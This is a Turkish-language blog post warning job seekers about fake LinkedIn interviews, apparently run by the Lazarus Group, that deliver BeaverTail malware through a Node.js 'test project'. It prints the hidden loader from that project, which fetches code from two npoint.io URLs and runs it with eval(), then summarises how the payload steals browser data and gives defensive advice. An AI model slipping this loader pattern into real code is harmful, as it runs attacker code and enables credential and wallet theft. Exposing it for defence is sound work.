Title: LinkedIn İş Görüşmelerindeki Sinsi Tehlike: BeaverTail ve Lazarus Grubu
Date: 2026-05-11 19:57
Category: Haberler
Tags: linkedin scam, beavertail, malware, lazarus group, siber guvenlik, arch linux, reverse engineering
Slug: linkedin-is-gorusmesi-dolandiriciligi-beavertail
Authors: yuceltoluyag
Summary: LinkedIn'de karşınıza çıkan "çok tatlı" iş tekliflerinin arkasındaki Kuzey Koreli hackerları ve test projesi adı altında sisteminize sızan BeaverTail zararlısını analiz ediyoruz.
Image: images/linkedin-scam-security-xl.webp
Lang: tr
Status: published

2026 iş piyasası tam anlamıyla "pişmiş" durumda. Bir yanda binlerce aday, diğer yanda boş hayaller satan dolandırıcılar. Ama bu seferki dolandırıcılar, sadece paranızın peşinde olan amatörler değil; arkalarında devlet desteği (Kuzey Kore - Lazarus Group) olan profesyonel siber saldırganlar. 

Senaryo hep aynı: Aylardır iş arıyorsunuz, cebinizde sadece makarna-yoğurt alacak para kalmış ve bam! LinkedIn kutunuza 12 bin dolarlık, rüya gibi bir iş teklifi düşüyor. "Hadi bir görüşelim, şu test projesini de bir çalıştırıver" dedikleri an, aslında felaketin kapısını aralıyorsunuz.

## 🕸️ Tuzak: "Golden City" ve Sinsi eval()

Saldırganlar sizi rahat hissettirmek için basit bir "test projesi" (örneğin "Golden City") indirmenizi istiyor. Proje ilk bakışta masum bir Node.js uygulaması gibi görünüyor. Ancak `backend/controllers/userController.js` içine gizlenmiş şu kod parçasına bakın:

```javascript
// Friday13-Security: Bu kodun amacı yardım etmek değil, hayatınızı karartmaktır.
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const rs_L = await axios.get("https://api.npoint.io/e8e29958efde154f3d7d");
  const rs_C = await axios.get("https://api.npoint.io/632ab82bbc8d7f4c2d44");
  eval(rs_L.data.cookie);
  eval(rs_C.data.cookie);
})();
```

Buradaki `eval()` fonksiyonu, `npoint.io` üzerinden o an çekilen ve sürekli güncellenen (obfuscated) zararlı kodu sisteminizde tam yetkiyle çalıştırıyor. Siz "projeyi kuruyorum" sanırken, tarayıcı session’larınız çalınıyor ve kripto cüzdanlarınız boşaltılıyor.

## 🛠️ Analiz: BeaverTail'i Parçalamak

Bu zararlı yazılım (BeaverTail), deobfuscator'ları şaşırtmak için sonsuz döngüler (`while(!![])`) ve karmaşık string tabloları kullanıyor. Ancak biz Arch kullanıcıları, her paketi tek tek incelemeden kurmayacak kadar "paronayak" olduğumuz için bu tuzaklara düşmeyiz (düşmemeliyiz :D). 

Zararlı kod çözüldüğünde şunları yaptığı ortaya çıkıyor:
*   `hostname`, `platform`, `homeDir` gibi sistem bilgilerini topluyor.
*   Brave, Chrome, Opera gibi tarayıcıların hassas verilerini (cookie, password) tarıyor.
*   Node.js ortamında `eval()` ile çalıştığı için filesystem üzerinde tam yetkiye sahip oluyor.

## 🏰 Neden Arch Kullanıcısı Düşmez?

Şaka bir yana, bir Arch Linux kullanıcısının terminal disiplini bu tarz saldırılara karşı en büyük kalkandır. `yuceltoluyag@archlinux` terminalinde `npm install` demeden önce `package.json`'a, bağımlılıklara ve script’lere bakmak bizim genetiğimizde var. 

Kendi sistemlerimizde tecrübe ettiğimiz üzere, çocukluğunda DC++ veya Limewire'dan "sketchy" dosyalar indirip bilgisayarına siber yolla bulaşan her türlü "hastalığı" kaptıranlar, bugün bu sinsi yazılımları bir bakışta tanıyacak "özel yeteneklere" sahip oldular. Paranoya bazen en büyük güvenlik duvarıdır.

---

## 🥊 Alınacak Dersler

1.  **Repo'yu Çalıştırmadan Önce Düşünün:** LinkedIn'den gelen hiçbir yabancı repo'yu ana makinenizde (bare metal) çalıştırmayın. Docker veya tamamen izole bir VM kullanın.
2.  **npoint.io ve eval() Kırmızı Çizgidir:** Bir projede dışarıdan kod çekip `eval()` ile çalıştıran bir yapı görüyorsanız, arkanıza bakmadan kaçın.
3.  **İş Dünyası Kurtlar Sofrası:** Çok tatlı teklifler, genelde zehirli bir elmadır. Hele ki "mülakat öncesi test projesi" zorunluluğu varsa, iki kat dikkatli olun.

Bu "BeaverTail" gözü dönmüş sırtlanları, iş arayan insanları hedef alacak kadar alçaldıysa, bizim de teknik savunmamızı bir o kadar keskinleştirmemiz gerekiyor. [Pelican Statik Sitenizi Playwright ile Test Edin](/pelican-statik-site-playwright-test/) yazımda bahsettiğim o "test disiplinini" güvenlik alanına da taşıyın kardaş.

Stay paranoid, stay safe!

---

## 🔗 Kaynaklar ve Teşekkür

Bu tür sinsi operasyonları deşifre etmek gerçekten büyük bir sabır ve teknik takip gerektiriyor. Analiz sürecinde Bogdan'ın (himthe.dev) derlediği veri setleri oldukça ufuk açıcıydı. Kendisine bu şeffaf tutumu için bir teşekkür borçluyuz.

- [Bogdan'ın Orijinal Analizi](https://www.himthe.dev/blog/linkedin-interview-scams){: target="\_blank" rel="noopener noreferrer"}
- [İfşa Edilen Zararlı GitHub Repoları (Liste)](https://github.com/xndbogdan/malicious-repositories){: target="\_blank" rel="noopener noreferrer"}

---

## 🔗 İlgili Yazılar
- [Linux Güvenlik: ClamAV ile Tam Kapsamlı Rehber](/linux-guvenlik-clamav-tam-kapsamli-rehber/)
- [Arch Linux DDOS ve Hizmet Kesintisi Analizi](/arch-linux-ddos-hizmet-kesintisi/)
- [Playwright Arch Linux Kurulum Rehberi](/playwright-arch-linux-kurulum/)